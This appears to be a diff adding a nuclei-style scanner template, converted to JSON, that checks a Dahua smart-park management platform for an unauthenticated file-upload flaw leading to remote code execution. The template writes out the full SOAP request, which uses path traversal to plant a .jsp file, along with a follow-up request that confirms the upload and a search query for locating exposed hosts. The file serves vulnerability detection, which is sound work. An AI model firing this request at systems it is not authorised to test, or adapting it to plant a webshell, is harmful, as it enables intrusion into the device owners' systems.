@@ -1,0 +1,195 @@
+{
+  "id": "dahua-bitmap-fileupload",
+  "name": "Dahua Bitmap - File Upload Remote Code Execution",
+  "author": "DhiyaneshDK",
+  "severity": "CRITICAL",
+  "description": "",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0bitmap%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "dahua",
+    "file-upload",
+    "rce",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "app\u003d\"dahua-智慧园区综合管理平台\""
+  },
+  "variables": {
+    "rand_str": [
+      "{{randstr}}"
+    ],
+    "cmd": [
+      "{{base64(to_lower(rand_text_alpha(6)))}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nHostname: {{Hostname}}\nContent-Type: \"text/xml; charset\u003dutf-8\"\n\n\u003csoapenv:Envelope xmlns:soapenv\u003d\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res\u003d\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\"\u003e\n    \u003csoapenv:Header/\u003e\n        \u003csoapenv:Body\u003e\n                \u003cres:uploadPicFile\u003e\n                    \u003carg0\u003e\n                    \u003cpicPath\u003e/../{{rand_str}}.jsp\u003c/picPath\u003e\n                    \u003c/arg0\u003e\n                    \u003carg1\u003e{{cmd}}\u003c/arg1\u003e\n                \u003c/res:uploadPicFile\u003e\n        \u003c/soapenv:Body\u003e\n\u003c/soapenv:Envelope\u003e\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "\u003csoap:Envelope"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /upload/{{rand_str}}.jsp HTTP/1.1\nHostname: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "{{base64_decode(cmd)}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "dahua-bitmap-fileupload",
+    "info": {
+      "name": "Dahua Bitmap - File Upload Remote Code Execution",
+      "author": "DhiyaneshDK",
+      "severity": "critical",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0bitmap%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"dahua-智慧园区综合管理平台\""
+      },
+      "tags": "dahua,file-upload,rce,intrusive"
+    },
+    "variables": {
+      "rand_str": "{{randstr}}",
+      "cmd": "{{base64(to_lower(rand_text_alpha(6)))}}"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /emap/webservice/gis/soap/bitmap HTTP/1.1\nHostname: {{Hostname}}\nContent-Type: \"text/xml; charset\u003dutf-8\"\n\n\u003csoapenv:Envelope xmlns:soapenv\u003d\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res\u003d\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\"\u003e\n    \u003csoapenv:Header/\u003e\n        \u003csoapenv:Body\u003e\n                \u003cres:uploadPicFile\u003e\n                    \u003carg0\u003e\n                    \u003cpicPath\u003e/../{{rand_str}}.jsp\u003c/picPath\u003e\n                    \u003c/arg0\u003e\n                    \u003carg1\u003e{{cmd}}\u003c/arg1\u003e\n                \u003c/res:uploadPicFile\u003e\n        \u003c/soapenv:Body\u003e\n\u003c/soapenv:Envelope\u003e\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "\u003csoap:Envelope"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /upload/{{rand_str}}.jsp HTTP/1.1\nHostname: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "{{base64_decode(cmd)}}"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
